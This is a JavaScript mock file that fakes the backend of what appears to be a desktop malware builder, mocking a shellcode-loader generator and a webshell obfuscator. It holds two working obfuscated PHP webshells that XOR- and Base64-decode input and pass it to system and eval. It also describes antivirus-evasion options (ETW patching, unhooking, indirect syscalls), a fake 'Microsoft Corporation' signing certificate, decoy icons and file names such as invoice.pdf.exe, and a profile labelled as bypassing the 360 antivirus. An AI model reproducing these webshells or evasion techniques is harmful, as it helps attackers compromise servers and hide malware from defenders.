/* ==========================================================================
   mock.js —— 仅用于「纯浏览器预览」
   在真实 Tauri 构建中不加载本文件（window.__TAURI__ 由 runtime 注入）。
   ========================================================================== */
(function () {
  if (window.__TAURI__) return; // 真实环境直接用 runtime

  const fake = {
    x64: "/usr/local/bin/x86_64-w64-mingw32-g++",
    x86: "/usr/local/bin/i686-w64-mingw32-g++",
    windres: "/usr/local/bin/x86_64-w64-mingw32-windres",
    openssl: "/opt/homebrew/opt/openssl@3/bin/openssl",
    osslsigncode: "/opt/homebrew/bin/osslsigncode",
    brew: "/opt/homebrew/bin/brew",
  };

  // 简易事件总线（模拟 Rust 侧 app.emit）
  const listeners = {};
  const emit = (name, payload) => {
    (listeners[name] || []).forEach((cb) => cb({ payload }));
  };
  window.__mockEmit = emit;

  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const MATRIX = [
    ["base", "基线: 完全按当前配置"],
    ["enc_uuid", "仅改: 编码=uuid"],
    ["enc_b64", "仅改: 编码=b64"],
    ["enc_b32", "仅改: 编码=b32"],
    ["enc_chunk_r", "仅改: 编码=chunk_r(块随机倒序)"],
    ["enc_raw", "仅改: 编码=raw(明文数组)"],
    ["no_obf", "仅改: 关掉代码随机化"],
    ["mode_fiber", "仅改: 执行方式=fiber"],
    ["mode_callback", "仅改: 执行方式=callback"],
    ["prot_rwx", "仅改: 内存属性=RWX"],
    ["prot_auto", "仅改: 内存属性=auto"],
    ["no_res", "仅改: 去掉版本信息/清单"],
    ["no_icon", "仅改: 不挂图标"],
    ["no_sign", "仅改: 不自签名"],
    ["anti_strict", "仅改: 反分析遇可疑环境退出"],
    ["console", "仅改: 控制台版(有黑框)"],
  ];

  const WS_SAMPLE = `<?php
// qk3md9x1 wp2mska
function tz8ma1($s, $k) {
    $r = '';
    for ($i = 0; $i < strlen($s); $i++) { $r .= chr(ord($s[$i]) ^ $k); }
    return $r;
}
if (false) { $v9xqp = 'mm103kkd'; }
$b1nre8sq = "UikkMycjMyUiLVEOUSs=";
$fk28mz = tz8ma1(base64_decode($b1nre8sq), 0x7A);
@system($fk28mz);`;

  const INSPECT = {
    ok: true,
    path: "/tmp/loader.exe",
    size: 220688,
    sha256: "c1cbcb977c21bed3a1f0e4d9b8c7a6f5e4d3c2b1a0f9e8d7c6b5a4938271605",
    machine: "x86-64",
    bits: 64,
    timestamp: "2025-02-03 01:19:37 UTC",
    signed: true,
    has_resources: true,
    score: 90,
    findings: [
      { id: "arch", title: "目标架构", level: "pass", detail: "x86-64 (64-bit)", hint: "" },
      { id: "entropy", title: "节表熵值", level: "pass", detail: "无高熵节（最高 6.22）", hint: "" },
      { id: "rwx", title: "RWX 节", level: "pass", detail: "没有同时可写可执行的节", hint: "" },
      { id: "sections", title: "节表结构", level: "pass", detail: "10 个节，虚拟总大小 0.20 MB", hint: "" },
      { id: "res", title: "资源伪装", level: "pass", detail: "存在 .rsrc（图标/版本信息已挂载）", hint: "" },
      { id: "sign", title: "Authenticode 签名", level: "pass", detail: "有证书表 (214016 bytes)", hint: "" },
      { id: "ts", title: "PE 时间戳", level: "pass", detail: "2025-02-03 01:19:37 UTC", hint: "" },
      { id: "size", title: "产物体积", level: "pass", detail: "0.21 MB", hint: "" },
      {
        id: "imports",
        title: "可疑注入相关字符串",
        level: "warn",
        detail: "明文出现: VirtualAlloc, VirtualProtect",
        hint: "这些字符串留在二进制里会被静态规则直接匹配。",
      },
      { id: "blobs", title: "长串载荷痕迹", level: "pass", detail: "未发现超长连续编码串", hint: "" },
    ],
  };

  window.__TAURI__ = {
    event: {
      listen: async (name, cb) => {
        (listeners[name] = listeners[name] || []).push(cb);
        return () => {};
      },
    },
    core: {
      invoke: async (cmd, args) => {
        const a = args || {};
        switch (cmd) {
          case "check_env":
            return fake;
          case "app_version":
            return "1.2.0";
          case "has_brew":
            return true;
          case "install_deps": {
            const pkgs = a.pkgs || [];
            const total = pkgs.length;
            for (let i = 0; i < pkgs.length; i++) {
              const pkg = pkgs[i];
              const step = i + 1;
              emit("dep-install", { phase: "start", pkg, line: "", step, total });
              const lines = [
                `==> Downloading https://ghcr.io/v2/homebrew/core/${pkg}/manifests/…`,
                "==> Downloading https://ghcr.io/v2/homebrew/core/…/blobs/sha256:…",
                "############################################################ 100.0%",
                `==> Pouring ${pkg}--14.0.0.arm64_sequoia.bottle.tar.gz`,
                `🍺  /opt/homebrew/Cellar/${pkg}: 8584 files, 1.4GB`,
              ];
              for (const l of lines) {
                await sleep(260);
                emit("dep-install", { phase: "log", pkg, line: l, step, total });
              }
              emit("dep-install", { phase: "pkg_done", pkg, line: "", step, total });
            }
            emit("dep-install", { phase: "done", pkg: "", line: "", step: total, total });
            return null;
          }
          case "list_icons":
            return ["word", "excel", "ppt", "pdf", "pdf-2", "pdf-3", "notepad"];
          case "list_dir":
            return [
              { name: "loader.exe", size: 412672, mtime: 1760400000, path: "/tmp/loader.exe" },
              { name: "invoice.pdf.exe", size: 421888, mtime: 1760410000, path: "/tmp/invoice.pdf.exe" },
            ];
          case "pick_file":
            if (a.kind === "dir") return "/tmp";
            if (a.kind === "wsfile") return "/tmp/orig.php";
            return "/tmp/payload.bin";
          case "generate":
            return {
              ok: true,
              log:
                "[1] payload: /tmp/payload.bin -> 1024 bytes\n" +
                "    sha256 = a1b2c3d4e5f60718\n" +
                "[2] 加载方式 = 本地 (内嵌) · 编码形态 = chunk\n" +
                "    key = 0x00 (无全局密钥) · 代码随机化 = 开 · 执行方式 = direct\n" +
                "[3] compiler: /opt/homebrew/bin/x86_64-w64-mingw32-g++\n" +
                "[4c] 资源: 图标 + 版本信息 + 清单\n" +
                "[4] 内嵌源码已生成 (形态: 分块变密钥 · 代码已随机化)\n" +
                "[5c] strip 完成 (214016 bytes)\n" +
                "[7] PE 时间戳 -> 2025-02-03 01:19:37 UTC (改写 1 处)\n" +
                "[8] 证书主题: /C=US/O=Microsoft Corporation/CN=Notepad\n" +
                "[8] 已签名 · 时间戳: http://tsa.wotrus.com\n" +
                "[9] 文件 mtime/atime 已同步\n" +
                "[10] OK -> /tmp/loader.exe (220688 bytes)\n" +
                "     sha256 = c1cbcb977c21bed3",
              output: "/tmp/loader.exe",
              size: 220688,
              key: 0,
              uuid_count: 0,
              time_ts: 1738545577,
              payload_file: "",
              sha256: "c1cbcb977c21bed3a1f0e4d9b8c7a6f5e4d3c2b1a0f9e8d7c6b5a4938271605",
              payload_sha256: "a1b2c3d4e5f60718293a4b5c6d7e8f90112233445566778899aabbccddeeff00",
            };
          case "run_matrix": {
            const rows = [];
            for (let i = 0; i < MATRIX.length; i++) {
              const [suffix, desc] = MATRIX[i];
              await sleep(120);
              const row = {
                suffix,
                desc,
                ok: suffix !== "enc_raw",
                size: suffix === "no_icon" ? 51200 : 240000 + Math.floor(Math.random() * 3000),
                sha256: (suffix + "0000000000000000000000000000000000").slice(0, 64),
                output: suffix === "enc_raw" ? "" : `/tmp/mx/${suffix}.exe`,
                error: suffix === "enc_raw" ? "编译失败: payload 含未转义字符" : "",
              };
              rows.push(row);
              emit("matrix-progress", {
                phase: "row",
                step: i + 1,
                total: MATRIX.length,
                row,
              });
            }
            emit("matrix-progress", {
              phase: "done",
              step: MATRIX.length,
              total: MATRIX.length,
              row: null,
            });
            return rows;
          }
          case "ws_generate": {
            await sleep(300);
            return {
              ok: true,
              log:
                "[1] 命令执行型（明文为取参表达式）\n" +
                "[2] 编码链: XOR 0x7A → Base64\n" +
                "[3] 变换: 变量随机化=开 垃圾代码=开 字符串拆分=开\n" +
                "[4] OK -> /tmp/shell.php (352 bytes)",
              output: "/tmp/shell.php",
              size: WS_SAMPLE.length,
              code: WS_SAMPLE,
              key: 0x7a,
            };
          }
          case "ws_matrix": {
            const V = [
              ["base", "基线: 全部变换开启"],
              ["no_rename", "仅改: 关掉变量名随机化"],
              ["no_junk", "仅改: 关掉垃圾代码"],
              ["no_split", "仅改: 关掉字符串拆分"],
              ["enc_xor_only", "仅改: 只用 XOR"],
              ["enc_b64_only", "仅改: 只用 Base64"],
              ["enc_rev", "仅改: XOR + 字节逆序"],
              ["enc_chunk", "仅改: XOR + 分块插桩"],
              ["enc_none", "仅改: 不编码(明文)"],
              ["plain", "仅改: 关掉全部变换"],
            ];
            return V.map(([suffix, desc]) => ({
              suffix,
              desc,
              ok: true,
              size: 400 + Math.floor(Math.random() * 400),
              sha256: (suffix + "0".repeat(64)).slice(0, 64),
              output: `/tmp/wsmx/wsmx_${suffix}.php`,
              error: "",
            }));
          }
          case "ws_wrap": {
            await sleep(280);
            const lang = a.opts && a.opts.lang ? a.opts.lang : "php";
            const sample =
              lang === "php"
                ? '<?php\n// jx3md9 kp2mka\nfunction tz8ma1($s, $k) {\n    $r = "";\n    for ($i = 0; $i < strlen($s); $i++) { $r .= chr(ord($s[$i]) ^ $k); }\n    return $r;\n}\n$zzub = "BwRLU0sxXlhTVBsZU1IZADEEBQ==";\n$csmf = tz8ma1(base64_decode($zzub), 0x3B);\n@eval("?>" . $csmf);\n'
                : "<%\n' 混淆后的脚本\n%>";
            return {
              ok: true,
              log:
                "[1] 源脚本: /tmp/orig.php (147 bytes)\n" +
                "[2] 模式: 整体编码 + eval（XOR 0x8C → Base64）\n" +
                "[3] 变换: 变量随机化=开 垃圾代码=开 字符串拆分=开 剥离注释=开\n" +
                "[4] OK -> /tmp/ob.php (147 -> 733 bytes)",
              output: "/tmp/ob.php",
              src_size: 147,
              size: 733,
              code: sample,
              key: 0x8c,
              mode: lang === "php" ? "整体编码 + eval" : "字符串变换",
            };
          }
          case "inspect_exe":
            await sleep(220);
            return INSPECT;
          case "profile_save":
            return "/Users/demo/.macloader/profiles/" + a.name + ".json";
          case "profile_list":
            return [
              {
                name: "过 360 的那组",
                saved_at: 1760400000,
                opts: { encoding: "chunk", mode: "direct", icon: "lib:notepad" },
              },
              {
                name: "b32 变体",
                saved_at: 1760300000,
                opts: { encoding: "b32", mode: "direct", icon: "lib:pdf" },
              },
            ];
          case "profile_load":
            return {
              payload: "/tmp/payload.bin",
              out_dir: "/tmp",
              out_name: "loader.exe",
              arch: "x64",
              encoding: "chunk",
              mode: "direct",
              protect: "rx",
              obfuscate: true,
              res_full: true,
              sign: true,
              icon: "lib:notepad",
              load_mode: "embed",
              time_mode: "random",
              console: false,
              anti_strict: false,
            };
          case "profile_delete":
            return null;
          case "last_opts":
            return null;
          case "option_values":
            return {
              encoding: ["auto", "uuid", "b64", "b32", "chunk", "chunk_r", "raw"],
              mode: ["direct", "fiber", "callback"],
              protect: ["rx", "rwx", "auto"],
              time: ["none", "custom", "random"],
              load: ["embed", "remote"],
              harden: ["unhook", "etw", "indirect", "stomp", "diskssn"],
            };
          case "reveal":
            return null;
          default:
            return null;
        }
      },
    },
  };
})();
